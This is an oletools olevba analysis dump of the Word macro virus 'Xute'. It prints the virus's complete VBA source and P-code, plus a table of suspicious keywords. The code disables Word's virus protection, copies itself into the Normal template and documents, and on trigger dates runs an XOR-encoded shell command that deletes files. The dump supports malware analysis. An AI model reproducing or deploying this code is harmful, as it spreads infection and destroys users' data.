olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Xute
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Xute - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Xute.bas 
in file: Virus.MSWord.Xute - OLE stream: 'Macros/VBA/Xute'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const ID_VIR = "Alm|"
Const DIR_VIR = "Z#EALM\7]XM"
Const FX_VIR = "]\UMK\\96@9E373"
Const GREETS = "Rlmk|a9{`9Alm|"

Private Function encr(s, k As Integer)
    Dim r
    r = ""
    For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next
    encr = r
End Function

Sub AutoClose()
    Dim IsInDoc, IsInTem As Boolean
    Dim InDoc, InTem As Integer
    Dim iDay, iMon As Integer
    Dim DatFx As String
    On Error GoTo Done
    IsInTem = False
    IsInDoc = False
    InDoc = 0
    InTem = 0
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    DatFx = Date$
    iDay = Val(Mid$(DatFx, 4, 2)): iMon = Val(Mid$(DatFx, 1, 2))
    If (iMon = 7 And iDay = 26) Or (iDay + iMon) = 30 Then
        DatFx = encr(FX_VIR, 25)
        Shell DatFx, 0
        MsgBox "wow" & encr(GREETS, 25)
    End If
    
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = encr(ID_VIR, 25) Then
            IsInDoc = True
            InDoc = i
        End If
    Next
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = encr(ID_VIR, 25) Then
            IsInTem = True
            InTem = i
        End If
    Next
    If Not IsInTem Then
        ActiveDocument.VBProject.VBComponents(InDoc).Export encr(DIR_VIR, 25)
        NormalTemplate.VBProject.VBComponents.Import encr(DIR_VIR, 25)
        NormalTemplate.Save
    End If
    If Not IsInDoc And ActiveDocument.Saved = False Then
        NormalTemplate.VBProject.VBComponents(InTem).Export encr(DIR_VIR, 25)
        ActiveDocument.VBProject.VBComponents.Import encr(DIR_VIR, 25)
        ActiveDocument.Save
    End If
    Kill encr(DIR_VIR, 25)
Done:
    Application.ScreenUpdating = True
    Application.DisplayAlerts = wdAlertsAll
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Xute
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Xute - 3916 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x0004 "Alm|"
' 	VarDefn ID_VIR
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x000B "Z#EALM\7]XM"
' 	VarDefn DIR_VIR
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x000F "]\UMK\\96@9E373"
' 	VarDefn FX_VIR
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x000E "Rlmk|a9{`9Alm|"
' 	VarDefn GREETS
' Line #4:
' Line #5:
' 	FuncDefn (Private Function encr(s, k As Integer))
' Line #6:
' 	Dim 
' 	VarDefn r
' Line #7:
' 	LitStr 0x0000 ""
' 	St r 
' Line #8:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld r 
' 	Ld s 
' 	Ld False 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Paren 
' 	Ld k 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St r 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #9:
' 	Ld r 
' 	St encr 
' Line #10:
' 	EndFunc 
' Line #11:
' Line #12:
' 	FuncDefn (Sub AutoClose())
' Line #13:
' 	Dim 
' 	VarDefn IsInDoc
' 	VarDefn IsInTem (As Boolean)
' Line #14:
' 	Dim 
' 	VarDefn InDoc
' 	VarDefn InTem (As Integer)
' Line #15:
' 	Dim 
' 	VarDefn iDay
' 	VarDefn iMon (As Integer)
' Line #16:
' 	Dim 
' 	VarDefn DatFx (As String)
' Line #17:
' 	OnError Done 
' Line #18:
' 	LitVarSpecial (False)
' 	St IsInTem 
' Line #19:
' 	LitVarSpecial (False)
' 	St IsInDoc 
' Line #20:
' 	LitDI2 0x0000 
' 	St InDoc 
' Line #21:
' 	LitDI2 0x0000 
' 	St InTem 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #26:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #27:
' 	Ld Date$ 
' 	St DatFx 
' Line #28:
' 	Ld DatFx 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St iDay 
' 	BoS 0x0000 
' 	Ld DatFx 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St iMon 
' Line #29:
' 	Ld iMon 
' 	LitDI2 0x0007 
' 	Eq 
' 	Ld iDay 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld iDay 
' 	Ld iMon 
' 	Add 
' 	Paren 
' 	LitDI2 0x001E 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #30:
' 	Ld FX_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	St DatFx 
' Line #31:
' 	Ld DatFx 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #32:
' 	LitStr 0x0003 "wow"
' 	Ld GREETS 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #36:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld ID_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	LitVarSpecial (True)
' 	St IsInDoc 
' Line #38:
' 	Ld i 
' 	St InDoc 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld ID_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitVarSpecial (True)
' 	St IsInTem 
' Line #44:
' 	Ld i 
' 	St InTem 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	StartForVariable 
' 	Next 
' Line #47:
' 	Ld IsInTem 
' 	Not 
' 	IfBlock 
' Line #48:
' 	Ld DIR_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	Ld InDoc 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #49:
' 	Ld DIR_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #50:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld IsInDoc 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #53:
' 	Ld DIR_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	Ld InTem 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #54:
' 	Ld DIR_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #55:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Ld DIR_VIR 
' 	LitDI2 0x0019 
' 	ArgsLd encr 0x0002 
' 	ArgsCall Kill 0x0001 
' Line #58:
' 	Label Done 
' Line #59:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #60:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #61:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

